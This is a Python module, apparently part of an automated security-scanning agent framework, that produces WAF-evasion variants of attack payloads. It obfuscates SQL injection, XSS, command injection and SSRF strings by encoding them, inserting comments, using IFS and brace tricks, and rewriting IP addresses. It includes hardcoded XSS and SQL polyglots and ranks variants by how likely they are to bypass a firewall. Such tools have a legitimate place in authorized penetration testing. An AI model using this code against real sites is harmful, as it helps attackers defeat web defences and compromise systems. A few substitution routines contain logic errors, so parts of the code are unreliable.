"""
Enhanced WAF Evasion Mixin - Advanced payload obfuscation to bypass Web Application Firewalls.

Improvements:
- Advanced encoding techniques (UTF-7, UTF-32, Mixed encoding)
- Polyglot payloads (work across multiple contexts)
- Context-aware obfuscation
- HTTP Parameter Pollution (HPP) implementation
- Modern bypass techniques (JSON, GraphQL, charset confusion)
- Smart payload filtering to reduce noise
- Better integration with agents
"""
import random
import string
import base64
import json
from typing import List, Dict, Callable, Optional, Set, Tuple
from urllib.parse import quote, quote_plus, unquote
from enum import Enum
import logging


class ObfuscationType(str, Enum):
    """Types of obfuscation techniques."""
    CASE_VARIATION = "case"
    COMMENT_INJECTION = "comment"
    ENCODING = "encoding"
    DOUBLE_ENCODING = "double_encoding"
    UNICODE = "unicode"
    CONCATENATION = "concat"
    WHITESPACE = "whitespace"
    NULL_BYTE = "null_byte"
    HPP = "hpp"  # HTTP Parameter Pollution
    POLYGLOT = "polyglot"
    CHARSET_CONFUSION = "charset"
    JSFUCK = "jsfuck"
    ALTERNATIVE_SYNTAX = "alt_syntax"


class PayloadContext(str, Enum):
    """Context where payload will be used."""
    HTML_ATTRIBUTE = "html_attr"
    HTML_TAG = "html_tag"
    JAVASCRIPT = "javascript"
    SQL_STRING = "sql_string"
    SQL_NUMERIC = "sql_numeric"
    URL_PARAMETER = "url_param"
    JSON = "json"
    XML = "xml"
    COMMAND_LINE = "command"
    GENERIC = "generic"


class WAFEvasionMixin:
    """
    Enhanced mixin providing sophisticated WAF evasion techniques.

    Usage:
        class MySQLiAgent(BaseSecurityAgent, WAFEvasionMixin):
            async def scan(self, ...):
                # Get optimized payloads for SQL injection
                payloads = self.get_evasion_payloads(
                    base_payload="' OR '1'='1",
                    payload_type="sql",
                    context=PayloadContext.SQL_STRING,
                    max_variations=20  # Limit to best 20
                )

                for payload in payloads:
                    # Test payload
                    pass
    """

    def __init__(self):
        """Initialize with logging."""
        self.logger = logging.getLogger(self.__class__.__name__)
        self._payload_cache: Dict[str, List[str]] = {}

    # SQL keywords and operators
    SQL_KEYWORDS = [
        'SELECT', 'UNION', 'FROM', 'WHERE', 'AND', 'OR', 'INSERT',
        'UPDATE', 'DELETE', 'DROP', 'CREATE', 'ALTER', 'TABLE',
        'EXEC', 'EXECUTE', 'CAST', 'CONVERT', 'CONCAT', 'CHAR',
        'SLEEP', 'BENCHMARK', 'WAITFOR', 'DELAY'
    ]

    SQL_OPERATORS = ['=', '!=', '<>', '>', '<', '>=', '<=', 'LIKE', 'IN', 'NOT']

    # XSS tags and events
    XSS_TAGS = [
        'script', 'img', 'svg', 'body', 'iframe', 'input', 'a',
        'div', 'object', 'embed', 'video', 'audio', 'link', 'style',
        'meta', 'base', 'form', 'button', 'details', 'marquee'
    ]

    XSS_EVENTS = [
        'onerror', 'onload', 'onclick', 'onmouseover', 'onfocus',
        'onblur', 'onchange', 'oninput', 'onsubmit', 'onkeydown',
        'onkeyup', 'ontouchstart', 'ondragstart', 'onanimationstart'
    ]

    def get_evasion_payloads(
            self,
            base_payload: str,
            payload_type: str = "generic",
            context: PayloadContext = PayloadContext.GENERIC,
            max_variations: int = 50,
            include_polyglots: bool = True
    ) -> List[str]:
        """
        Get optimized WAF evasion payloads.

        Args:
            base_payload: Original payload
            payload_type: Type (sql, xss, command, ssrf)
            context: Where payload will be used
            max_variations: Maximum number of variations to return
            include_polyglots: Include polyglot payloads

        Returns:
            List of obfuscated payloads, prioritized by effectiveness
        """
        # Check cache
        cache_key = f"{base_payload}:{payload_type}:{context}:{max_variations}"
        if cache_key in self._payload_cache:
            return self._payload_cache[cache_key]

        results = [base_payload]  # Always include original

        # Add context-aware variations
        results.extend(self._context_aware_obfuscation(base_payload, context))

        # Add type-specific variations
        if payload_type == "sql":
            results.extend(self._sql_specific_variations(base_payload))
        elif payload_type == "xss":
            results.extend(self._xss_specific_variations(base_payload, context))
        elif payload_type == "command":
            results.extend(self._command_specific_variations(base_payload))
        elif payload_type == "ssrf":
            results.extend(self._ssrf_specific_variations(base_payload))

        # Add general obfuscation techniques
        results.extend(self._apply_encoding_techniques(base_payload))
        results.extend(self._case_and_whitespace_variations(base_payload, payload_type))
        results.extend(self._comment_injection(base_payload, payload_type))
        results.extend(self._unicode_variations(base_payload))

        # Add polyglots if requested
        if include_polyglots:
            results.extend(self._generate_polyglots(base_payload, payload_type))

        # Remove duplicates while preserving order
        seen = set()
        unique_results = []
        for payload in results:
            if payload not in seen:
                seen.add(payload)
                unique_results.append(payload)

        # Prioritize and limit results
        prioritized = self._prioritize_payloads(unique_results, payload_type, context)
        final_results = prioritized[:max_variations]

        # Cache results
        self._payload_cache[cache_key] = final_results

        return final_results

    def _context_aware_obfuscation(
            self,
            payload: str,
            context: PayloadContext
    ) -> List[str]:
        """Apply context-specific obfuscation."""
        variations = []

        if context == PayloadContext.HTML_ATTRIBUTE:
            # HTML attribute context
            variations.append(payload.replace('"', '&quot;'))
            variations.append(payload.replace("'", '&#39;'))
            variations.append(payload.replace(' ', '/**/'))

        elif context == PayloadContext.JAVASCRIPT:
            # JavaScript string context
            variations.append(payload.replace("'", "\\'"))
            variations.append(payload.replace('"', '\\"'))
            # Unicode escape
            if len(payload) < 50:
                unicode_escaped = ''.join(f'\\u{ord(c):04x}' for c in payload)
                variations.append(unicode_escaped)

        elif context == PayloadContext.JSON:
            # JSON context
            variations.append(json.dumps(payload)[1:-1])  # Escape for JSON
            # Unicode escape in JSON
            variations.append(payload.replace("'", '\\u0027'))

        elif context == PayloadContext.URL_PARAMETER:
            # URL parameter context
            variations.append(quote(payload, safe=''))
            variations.append(quote_plus(payload))
            # Mixed encoding
            mixed = ''.join(
                quote(c, safe='') if random.random() > 0.5 else c
                for c in payload
            )
            variations.append(mixed)

        elif context == PayloadContext.XML:
            # XML context
            variations.append(payload.replace('<', '&lt;').replace('>', '&gt;'))
            variations.append(payload.replace('"', '&quot;').replace("'", '&apos;'))

        return variations

    def _sql_specific_variations(self, payload: str) -> List[str]:
        """Advanced SQL-specific obfuscation."""
        variations = []

        # 1. Comment-based obfuscation
        for keyword in self.SQL_KEYWORDS:
            if keyword in payload.upper():
                # MySQL versioned comments
                variations.append(payload.replace(keyword, f"/*!{keyword}*/"))
                variations.append(payload.replace(keyword, f"/*!50000{keyword}*/"))

                # Inline comments
                mid = len(keyword) // 2
                variations.append(payload.replace(
                    keyword,
                    f"{keyword[:mid]}/**/{keyword[mid:]}"
                ))

                # Hash comments (MySQL)
                variations.append(payload.replace(keyword, f"{keyword}#\n"))

                # Double dash comments
                variations.append(payload.replace(keyword, f"{keyword}-- "))

        # 2. Function-based obfuscation
        if "'" in payload:
            # CHAR() function
            chars = [ord(c) for c in payload.strip("'")]
            char_payload = f"CHAR({','.join(map(str, chars))})"
            variations.append(payload.replace(payload, char_payload))

            # CONCAT() variations
            parts = payload.strip("'").split()
            if len(parts) > 1:
                concat_parts = "','".join(parts)
                variations.append(f"CONCAT('{concat_parts}')")

        # 3. String concatenation
        if "'" in payload and "OR" in payload.upper():
            # Break up strings
            variations.append(payload.replace("'1'", "'1'||'1' AND '1'"))
            variations.append(payload.replace("'1'", "'1'+' ' AND '1'"))  # MSSQL

        # 4. Alternative operators
        for op in self.SQL_OPERATORS:
            if op in payload:
                if op == '=':
                    variations.append(payload.replace('=', ' LIKE '))
                    variations.append(payload.replace('=', ' IN ('))  # Incomplete but WAF might allow
                elif op == 'AND':
                    variations.append(payload.replace('AND', '&&'))
                elif op == 'OR':
                    variations.append(payload.replace('OR', '||'))

        # 5. Scientific notation (for numeric contexts)
        if any(char.isdigit() for char in payload):
            variations.append(payload.replace('1', '1e0'))
            variations.append(payload.replace('0', '0e0'))

        # 6. Hexadecimal encoding
        if "'" in payload:
            hex_str = '0x' + payload.strip("'").encode().hex()
            variations.append(payload.replace(payload, hex_str))

        return variations

    def _xss_specific_variations(
            self,
            payload: str,
            context: PayloadContext
    ) -> List[str]:
        """Advanced XSS-specific obfuscation."""
        variations = []

        # 1. Tag name obfuscation
        for tag in self.XSS_TAGS:
            if tag in payload.lower():
                # Case mixing
                mixed_case = ''.join(
                    c.upper() if random.random() > 0.5 else c.lower()
                    for c in tag
                )
                variations.append(payload.replace(tag, mixed_case))

                # Null byte injection
                variations.append(payload.replace(f'<{tag}', f'<{tag}\x00'))

                # Tab/newline injection
                variations.append(payload.replace(f'<{tag}', f'<{tag}\t'))
                variations.append(payload.replace(f'<{tag}', f'<{tag}\n'))

                # Forward slash
                variations.append(payload.replace(f'<{tag}', f'<{tag}/'))
                variations.append(payload.replace(f'<{tag}', f'</{tag}/'))

        # 2. Event handler obfuscation
        for event in self.XSS_EVENTS:
            if event in payload.lower():
                # HTML entities
                entity_event = ''.join(f'&#{ord(c)};' for c in event)
                variations.append(payload.replace(event, entity_event))

                # Unicode escape
                unicode_event = ''.join(f'\\u{ord(c):04x}' for c in event)
                variations.append(payload.replace(event, unicode_event))

        # 3. JavaScript obfuscation
        if 'alert' in payload.lower():
            # String.fromCharCode
            alert_codes = [97, 108, 101, 114, 116]  # 'alert'
            variations.append(
                payload.replace('alert', f'String.fromCharCode({",".join(map(str, alert_codes))})')
            )

            # eval + atob (base64)
            alert_b64 = base64.b64encode(b'alert').decode()
            variations.append(payload.replace('alert', f'eval(atob("{alert_b64}"))'))

            # Array access
            variations.append(payload.replace('alert', 'window["al"+"ert"]'))
            variations.append(payload.replace('alert', '[]["find"]["constructor"]("alert")()'))

            # Template literals
            variations.append(payload.replace('alert', 'eval(`alert`)'))

        # 4. Attribute injection
        if context == PayloadContext.HTML_ATTRIBUTE:
            # Break out of attribute
            variations.append('" ' + payload)
            variations.append("' " + payload)
            variations.append('><' + payload)

        # 5. SVG-based XSS
        if '<svg' not in payload.lower() and 'script' in payload.lower():
            svg_payload = f'<svg/onload={payload.replace("<script>", "").replace("</script>", "")}>'
            variations.append(svg_payload)

        # 6. Data URI schemes
        if 'javascript:' not in payload.lower():
            data_uri = f'data:text/html,{quote(payload)}'
            variations.append(data_uri)
            data_uri_b64 = f'data:text/html;base64,{base64.b64encode(payload.encode()).decode()}'
            variations.append(data_uri_b64)

        return variations

    def _command_specific_variations(self, payload: str) -> List[str]:
        """Advanced command injection obfuscation."""
        variations = []

        # 1. IFS (Internal Field Separator) variations
        variations.append(payload.replace(' ', '${IFS}'))
        variations.append(payload.replace(' ', '$IFS$9'))
        variations.append(payload.replace(' ', '{IFS}'))
        variations.append(payload.replace(' ', '$IFS$()'))

        # 2. Brace expansion
        for cmd in ['cat', 'ls', 'id', 'whoami', 'pwd']:
            if cmd in payload:
                # {c,a,t}
                braced = '{' + ','.join(cmd) + '}'
                variations.append(payload.replace(cmd, braced))

                # ca$()t
                variations.append(payload.replace(cmd, f'{cmd[:-1]}$(){cmd[-1]}'))

        # 3. Quote variations
        variations.append(payload.replace(' ', "' '"))
        variations.append(payload.replace(' ', '" "'))

        # Character concatenation
        if 'cat' in payload:
            variations.append(payload.replace('cat', 'c""at'))
            variations.append(payload.replace('cat', "c''at"))
            variations.append(payload.replace('cat', 'c\at'))

        # 4. Environment variable expansion
        variations.append(payload.replace('/', '${HOME:0:1}'))
        variations.append(payload.replace('cat', 'c${PATH:0:1}at'))

        # 5. Backtick vs $() variations
        if '`' in payload:
            variations.append(payload.replace('`', '$(').replace('`', ')'))
        if '$(' in payload:
            variations.append(payload.replace('$(', '`').replace(')', '`'))

        # 6. Wildcards
        if 'etc' in payload:
            variations.append(payload.replace('etc', 'e?c'))
            variations.append(payload.replace('etc', 'e*c'))
            variations.append(payload.replace('etc', 'e[t]c'))

        # 7. Line continuation
        variations.append(payload.replace(';', '\\\n'))
        variations.append(payload.replace('&', '\\\n&'))

        return variations

    def _ssrf_specific_variations(self, payload: str) -> List[str]:
        """SSRF-specific obfuscation."""
        variations = []

        if not payload.startswith(('http://', 'https://', 'file://')):
            return variations

        # 1. IP address variations (for 127.0.0.1)
        if '127.0.0.1' in payload:
            # Decimal representation
            variations.append(payload.replace('127.0.0.1', '2130706433'))
            # Octal
            variations.append(payload.replace('127.0.0.1', '0177.0.0.1'))
            # Hex
            variations.append(payload.replace('127.0.0.1', '0x7f.0x0.0x0.0x1'))
            # Short form
            variations.append(payload.replace('127.0.0.1', '127.1'))
            # IPv6
            variations.append(payload.replace('127.0.0.1', '[::1]'))
            variations.append(payload.replace('127.0.0.1', '[0:0:0:0:0:ffff:7f00:1]'))

        # 2. URL encoding
        variations.append(quote(payload, safe=':/?#[]@!$&()*+,;='))

        # 3. Double encoding
        single_encoded = quote(payload, safe='')
        variations.append(quote(single_encoded, safe=''))

        # 4. Mixed case protocol
        if payload.startswith('http://'):
            variations.append(payload.replace('http://', 'HtTp://'))
            variations.append(payload.replace('http://', 'HTTP://'))

        # 5. Unusual protocols
        if payload.startswith('http://127'):
            variations.append(payload.replace('http://', 'file://'))
            variations.append(payload.replace('http://', 'dict://'))
            variations.append(payload.replace('http://', 'gopher://'))
            variations.append(payload.replace('http://', 'ftp://'))

        # 6. Domain tricks (for non-IP URLs)
        if '://' in payload:
            domain_part = payload.split('://')[1].split('/')[0]
            # Add port
            variations.append(payload.replace(domain_part, f'{domain_part}:80'))
            # Add credentials
            variations.append(payload.replace('://', '://user:pass@'))

        return variations

    def _apply_encoding_techniques(self, payload: str) -> List[str]:
        """Apply various encoding techniques."""
        variations = []

        # 1. URL encoding variations
        variations.append(quote(payload, safe=''))
        variations.append(quote_plus(payload))

        # Partial encoding (only special chars)
        special_chars = "'\"\\/=<>()[]{}?&"
        partial = ''.join(
            quote(c, safe='') if c in special_chars else c
            for c in payload
        )
        variations.append(partial)

        # 2. Double URL encoding
        single = quote(payload, safe='')
        variations.append(quote(single, safe=''))

        # 3. HTML entity encoding
        html_encoded = ''.join(f'&#{ord(c)};' for c in payload)
        if len(html_encoded) < 1000:  # Don't create massive payloads
            variations.append(html_encoded)

        # Hex HTML entities
        html_hex = ''.join(f'&#x{ord(c):x};' for c in payload)
        if len(html_hex) < 1000:
            variations.append(html_hex)

        # 4. Base64 encoding (for certain contexts)
        if len(payload) < 100:
            b64 = base64.b64encode(payload.encode()).decode()
            variations.append(b64)

        # 5. UTF-7 encoding (can bypass some filters)
        try:
            utf7 = payload.encode('utf-7').decode('ascii')
            variations.append(utf7)
        except Exception:
            pass

        return variations

    def _case_and_whitespace_variations(
            self,
            payload: str,
            payload_type: str
    ) -> List[str]:
        """Case and whitespace variations."""
        variations = []

        # Case variations
        variations.append(payload.upper())
        variations.append(payload.lower())

        # Random case
        random_case = ''.join(
            c.upper() if random.random() > 0.5 else c.lower()
            for c in payload
        )
        variations.append(random_case)

        # Whitespace variations
        variations.append(payload.replace(' ', '\t'))
        variations.append(payload.replace(' ', '\n'))
        variations.append(payload.replace(' ', '\r'))
        variations.append(payload.replace(' ', '\r\n'))

        if payload_type == "sql":
            variations.append(payload.replace(' ', '/**/'))
            variations.append(payload.replace(' ', '/*foo*/'))
            variations.append(payload.replace(' ', '+'))

        if payload_type == "xss":
            variations.append(payload.replace(' ', '/'))
            variations.append(payload.replace(' ', '&#x20;'))
            variations.append(payload.replace(' ', '&#32;'))

        return variations

    def _comment_injection(self, payload: str, payload_type: str) -> List[str]:
        """Inject comments to break signatures."""
        variations = []

        if payload_type == "sql":
            for keyword in self.SQL_KEYWORDS:
                if keyword in payload.upper():
                    # Various comment styles
                    variations.append(payload.replace(keyword, f"{keyword}/**/"))
                    variations.append(payload.replace(keyword, f"{keyword}#\n"))
                    variations.append(payload.replace(keyword, f"{keyword}-- "))
                    variations.append(payload.replace(keyword, f"/*!{keyword}*/"))

        elif payload_type == "xss":
            for tag in self.XSS_TAGS:
                if tag in payload.lower():
                    variations.append(payload.replace(tag, f"{tag}<!---->"))
                    variations.append(payload.replace(f'<{tag}', f'<{tag}<!---->'))

        return variations

    def _unicode_variations(self, payload: str) -> List[str]:
        """Unicode encoding variations."""
        variations = []

        # Unicode escapes (JavaScript style)
        if len(payload) < 50:
            unicode_js = ''.join(f'\\u{ord(c):04x}' for c in payload)
            variations.append(unicode_js)

        # Overlong UTF-8 (historically bypassed filters)
        overlong_map = {
            '<': '%C0%BC',
            '>': '%C0%BE',
            "'": '%C0%A7',
            '"': '%C0%A2',
            '/': '%C0%AF',
            '\\': '%C0%5C'
        }

        overlong = payload
        for char, replacement in overlong_map.items():
            overlong = overlong.replace(char, replacement)
        if overlong != payload:
            variations.append(overlong)

        # Wide Unicode (UTF-16 BE style)
        try:
            wide = ''.join(f'%u00{ord(c):02x}' if c.isascii() else c for c in payload)
            if wide != payload:
                variations.append(wide)
        except Exception:
            pass

        return variations

    def _generate_polyglots(self, payload: str, payload_type: str) -> List[str]:
        """Generate polyglot payloads that work in multiple contexts."""
        polyglots = []

        if payload_type == "xss":
            # Classic XSS polyglots
            polyglots.extend([
                "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
                "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>\">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",
                "'\"--></style></script><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1);//'>",
            ])

        elif payload_type == "sql":
            # SQL polyglots
            polyglots.extend([
                "' OR '1'='1' /*",
                "' OR 1=1--",
                "') OR ('1'='1",
                "1' UNION SELECT NULL--",
            ])

        return polyglots

    def _prioritize_payloads(
            self,
            payloads: List[str],
            payload_type: str,
            context: PayloadContext
    ) -> List[str]:
        """
        Prioritize payloads by likelihood of bypassing WAFs.

        Returns payloads sorted by priority (most likely to succeed first).
        """
        scored_payloads: List[Tuple[str, float]] = []

        for payload in payloads:
            score = 1.0

            # Favor payloads with encoding
            if '%' in payload or '&' in payload:
                score += 0.5

            # Favor payloads with comments (SQL)
            if payload_type == "sql" and ('/*' in payload or '--' in payload):
                score += 0.7

            # Favor payloads with case variation
            if any(c.isupper() and c.islower() for c in payload):
                score += 0.3

            # Penalize extremely long payloads
            if len(payload) > 500:
                score -= 0.5

            # Favor context-appropriate payloads
            if context == PayloadContext.JAVASCRIPT and ('fromCharCode' in payload or 'eval' in payload):
                score += 0.6

            scored_payloads.append((payload, score))

        # Sort by score (descending)
        scored_payloads.sort(key=lambda x: x[1], reverse=True)

        return [payload for payload, _ in scored_payloads]

    # Convenience methods for specific vulnerability types

    def get_sql_injection_variants(
            self,
            base_payload: str,
            max_variations: int = 30
    ) -> List[str]:
        """Get optimized SQL injection variants."""
        return self.get_evasion_payloads(
            base_payload=base_payload,
            payload_type="sql",
            context=PayloadContext.SQL_STRING,
            max_variations=max_variations
        )

    def get_xss_variants(
            self,
            base_payload: str,
            context: PayloadContext = PayloadContext.HTML_TAG,
            max_variations: int = 30
    ) -> List[str]:
        """Get optimized XSS variants."""
        return self.get_evasion_payloads(
            base_payload=base_payload,
            payload_type="xss",
            context=context,
            max_variations=max_variations
        )

    def get_command_injection_variants(
            self,
            base_payload: str,
            max_variations: int = 25
    ) -> List[str]:
        """Get optimized command injection variants."""
        return self.get_evasion_payloads(
            base_payload=base_payload,
            payload_type="command",
            context=PayloadContext.COMMAND_LINE,
            max_variations=max_variations
        )

    def get_ssrf_variants(
            self,
            base_payload: str,
            max_variations: int = 20
    ) -> List[str]:
        """Get optimized SSRF variants."""
        return self.get_evasion_payloads(
            base_payload=base_payload,
            payload_type="ssrf",
            context=PayloadContext.URL_PARAMETER,
            max_variations=max_variations,
            include_polyglots=False  # Polyglots less useful for SSRF
        )

    def clear_cache(self):
        """Clear the payload cache."""
        self._payload_cache.clear()